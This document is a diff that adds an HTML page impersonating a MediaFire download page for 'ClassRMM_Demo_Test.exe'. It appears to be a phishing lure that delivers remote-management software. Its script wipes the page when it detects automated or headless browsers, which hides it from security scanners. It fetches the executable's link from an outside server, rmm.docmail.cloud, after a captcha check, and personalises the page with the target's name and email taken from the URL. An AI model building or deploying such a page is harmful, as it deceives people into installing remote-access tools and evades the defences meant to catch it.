@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MediaFire - ClassRMM_Demo_Test.exe</title>
+<!-- 38689a30d2fdb5ee1ea0e8b3d8e60f2e618338a8025aab266ca3c08b7b603fdc --><!-- 9ba7487a48f2bdab5f894d9f -->
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;background:#f0f0f0;color:#333;min-height:100vh}
+.hdr{background:#fff;border-bottom:3px solid #31a354;height:54px;display:flex;align-items:center;padding:0 24px}
+.mf-logo{display:flex;align-items:center;gap:8px;text-decoration:none}
+.mf-logo-flame{width:28px;height:28px}
+.mf-logo-text{font-size:22px;font-weight:900;color:#31a354;letter-spacing:-.5px}
+.main{max-width:680px;margin:24px auto;padding:0 16px}
+.dl-card{background:#fff;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.12);overflow:hidden}
+.dl-card-top{background:linear-gradient(135deg,#31a354,#27ae60);padding:24px 24px 20px;color:#fff}
+.dl-title{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px;opacity:.8;margin-bottom:8px}
+.dl-fname{font-size:20px;font-weight:700;word-break:break-all;margin-bottom:4px}
+.dl-meta{font-size:13px;opacity:.8}
+.dl-card-body{padding:24px}
+.file-preview{display:flex;align-items:center;gap:16px;padding:16px;background:#f8f8f8;border-radius:6px;border:1px solid #e8e8e8;margin-bottom:20px}
+.preview-icon{flex-shrink:0}
+.preview-info{flex:1;min-width:0}
+.preview-name{font-size:14px;font-weight:700;color:#333;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.preview-sub{font-size:12px;color:#888;margin-top:3px}
+.fmsg{font-size:13px;color:#666;margin-bottom:4px}
+.recip{font-size:13px;color:#888;display:none;margin-top:2px}
+.verify-section{background:#f8f8f8;border:1px solid #e0e0e0;border-radius:6px;padding:16px 18px;margin-top:16px}
+.verify-title{font-size:12px;font-weight:700;color:#555;text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px}
+.cap-row{display:flex;justify-content:center}
+#cap-err{color:#c0392b;font-size:12px;margin-top:8px;display:none;text-align:center}
+#dl-btn{display:none;width:100%;margin-top:16px;padding:14px;background:#31a354;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit;transition:background .2s}
+#dl-btn:hover{background:#27913d}
+.mf-footer{text-align:center;font-size:11px;color:#aaa;margin-top:20px;padding-bottom:12px}
+.mf-footer a{color:#aaa;text-decoration:none}
+</style>
+<script src="https://js.hcaptcha.com/1/api.js" async defer></script>
+<script>(function(){
+var jdxyuqkc=navigator.webdriver||false;
+var tuzdretn=window.outerWidth===0||window.outerHeight===0;
+var mnwdbkdk=/HeadlessChrome|PhantomJS|Selenium|puppeteer/i.test(navigator.userAgent);
+if(jdxyuqkc||tuzdretn||mnwdbkdk){document.body.innerHTML='';return;}
+})();</script>
+</head>
+<body>
+<div class="hdr">
+  <a class="mf-logo" href="#">
+    <svg class="mf-logo-flame" viewBox="0 0 100 120" fill="none">
+      <path d="M50 0C50 0 80 30 80 60C80 76.6 66.6 90 50 90C33.4 90 20 76.6 20 60C20 52 23 44.5 28 39C28 54 36 63 50 66C42 55 45 38 50 0Z" fill="#31a354"/>
+      <path d="M50 66C36 63 28 54 28 39C23 44.5 20 52 20 60C20 76.6 33.4 90 50 90V66Z" fill="#27913d"/>
+    </svg>
+    <span class="mf-logo-text">MediaFire</span>
+  </a>
+</div>
+<div class="main">
+  <div class="dl-card">
+    <div class="dl-card-top">
+      <div class="dl-title">File Download</div>
+      <div class="dl-fname">ClassRMM_Demo_Test.exe</div>
+      <div class="dl-meta">Shared by ClassRMM</div>
+    </div>
+    <div class="dl-card-body">
+      <div class="file-preview">
+        <div class="preview-icon">
+          <svg width="44" height="52" viewBox="0 0 64 80">
+            <path d="M0 4C0 1.8 1.8 0 4 0H42L64 22V76C64 78.2 62.2 80 60 80H4C1.8 80 0 78.2 0 76V4Z" fill="#31a354"/>
+            <path d="M42 0L64 22H44C42.9 22 42 21.1 42 20V0Z" fill="rgba(255,255,255,.2)"/>
+            <rect x="12" y="32" width="40" height="4" rx="2" fill="white" opacity=".85"/>
+            <rect x="12" y="42" width="28" height="4" rx="2" fill="white" opacity=".6"/>
+            <rect x="12" y="52" width="34" height="4" rx="2" fill="white" opacity=".6"/>
+            <rect x="12" y="62" width="20" height="4" rx="2" fill="white" opacity=".4"/>
+          </svg>
+        </div>
+        <div class="preview-info">
+          <div class="preview-name">ClassRMM_Demo_Test.exe</div>
+          <div class="preview-sub">Test file — verifying Generate Link works end-to-end.</div>
+          <div class="recip" id="recipient-info"></div>
+        </div>
+      </div>
+      <div class="verify-section">
+        <div class="verify-title">Human Verification</div>
+        <div class="cap-row">
+          <div class="h-captcha" data-sitekey="7e1c1f66-9022-451c-b826-ec24878285a6" data-callback="onCaptchaSuccess"></div>
+        </div>
+        <div id="cap-err"></div>
+      </div>
+      <button id="dl-btn">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" style="vertical-align:middle;margin-right:8px"><path d="M13 5v8.586l3.293-3.293 1.414 1.414L12 17.414l-5.707-5.707 1.414-1.414L11 13.586V5h2zm-7 14h12v-2H6v2z"/></svg>
+        Download Now
+      </button>
+    </div>
+  </div>
+  <div class="mf-footer">&copy; 2025 MediaFire, LLC &nbsp;&middot;&nbsp; <a href="#">Privacy Policy</a> &nbsp;&middot;&nbsp; <a href="#">Terms</a></div>
+</div>
+<script>
+var _srv='https://rmm.docmail.cloud';var _lid=14;
+async function onCaptchaSuccess(token){
+var btn=document.getElementById('dl-btn');var err=document.getElementById('cap-err');
+err.style.display='none';
+try{
+var r=await fetch(_srv+'/generate-link/verify-captcha',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({link_id:_lid,captcha_token:token})});
+var d=await r.json();
+if(!r.ok){err.textContent=d.detail||'Verification failed. Please try again.';err.style.display='block';if(typeof hcaptcha!=='undefined')hcaptcha.reset();return;}
+var a=document.createElement('a');a.href=d.url;a.download=d.display_name;document.body.appendChild(a);
+btn.style.display='inline-flex';btn.onclick=function(){a.click();};
+}catch(e){err.textContent='Network error. Please try again.';err.style.display='block';if(typeof hcaptcha!=='undefined')hcaptcha.reset();}
+}
+function getParams(){
+var p=new URLSearchParams(window.location.search);var n=p.get('n')||'';var e=p.get('e')||'';
+var el=document.getElementById('recipient-info');if(!el)return;
+if(n||e){el.style.display='block';
+if(n&&e)el.textContent='For: '+decodeURIComponent(n)+' — '+decodeURIComponent(e);
+else el.textContent='For: '+decodeURIComponent(n||e);}
+}
+window.addEventListener('load',getParams);</script>
+</body></html>
